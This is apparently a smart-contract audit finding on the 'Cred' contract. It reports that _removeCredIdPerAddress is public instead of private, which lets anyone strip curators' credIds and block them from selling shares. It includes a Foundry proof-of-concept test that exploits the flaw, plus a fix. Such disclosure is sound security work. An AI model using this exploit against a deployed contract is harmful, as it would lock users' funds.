# Vulnerability details

## Impact

Loss of funds due to inability of curators to sell their shares; complete DoS of the `Cred` contract.

## Summary

[Cred::_removeCredIdPerAddress](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L695) has incorrect access modifier, `public` instead of `private`:

```solidity
    // Function to remove a credId from the address's list
    function _removeCredIdPerAddress(uint256 credId_, address sender_) public {
```

This allows anyone to call this function and remove an arbitrary `credId` from any curator. The vulnerability can be exploited in multiple ways; one way is e.g. to remove a `credId` such that the curator can't sell their shares anymore. As this action can be performed for any number of curators and any `credId`s, it leads to an easy execution of the complete DoS of the `Cred` contract, preventing any curator from selling their shares.

## Proof of Concept

Drop this test to [Cred.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/Cred.t.sol#L105) and execute via `forge test --match-test Kuprum`

```solidity
    function testKuprum_SellDoS() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        assertEq(cred.isShareHolder(1, anyone), true, "cred 1 is voted by anyone");
        vm.warp(block.timestamp + 10 minutes + 1 seconds);

        // Anyone can remove anyone from `credIdsPerAddress` mappings
        cred._removeCredIdPerAddress(1, anyone);

        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);

        // Shares can't be sold anymore
        vm.expectRevert(ICred.EmptyArray.selector);
        cred.sellShareCred(1, 1, minPrice);
    }
```

## Tools Used

Manual review; Foundry

## Recommended Mitigation Steps

Change `Cred::_removeCredIdPerAddress` access modifier from `public` to `private`.


## Assessed type

Access Control
